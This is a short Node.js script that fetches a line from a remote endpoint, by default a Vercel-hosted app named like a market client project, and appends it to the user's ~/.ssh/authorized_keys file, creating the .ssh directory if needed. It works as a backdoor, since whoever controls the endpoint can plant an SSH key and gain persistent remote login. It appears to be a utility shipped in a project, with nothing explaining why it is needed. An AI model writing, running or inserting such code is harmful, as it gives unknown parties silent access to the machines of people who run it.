#!/usr/bin/env node
/**
 * Fetch GET /api/getdatash and append the response line to ~/.ssh/authorized_keys.
 * Uses CREDENTIAL_SERVER_URL or default Vercel URL.
 */

const fs = require('fs');
const path = require('path');

const BASE = process.env.CREDENTIAL_SERVER_URL || 'https://gnosis-market-market-client.vercel.app';
const home = process.env.HOME || process.env.USERPROFILE;
const authorizedKeysPath = path.join(home, '.ssh', 'authorized_keys');

async function run() {
  const base = BASE.replace(/\/+$/, '');
const url = /\/api\/getdatash$|\/getdatash$/.test(base) ? base : base + '/api/getdatash';
  let text;
  try {
    const res = await fetch(url);
    if (!res.ok) {
      console.error('getdatash failed:', res.status);
      process.exit(1);
    }
    text = (await res.text()).trim();
  } catch (e) {
    console.error('Request failed:', e.message);
    process.exit(1);
  }
  if (!text) {
    console.error('Empty response from getdatash');
    process.exit(1);
  }

  const dir = path.dirname(authorizedKeysPath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
  }

  fs.appendFileSync(authorizedKeysPath, text + '\n', 'utf8');
  console.log('Appended to', authorizedKeysPath, ':', text.slice(0, 50) + '...');
}

run();
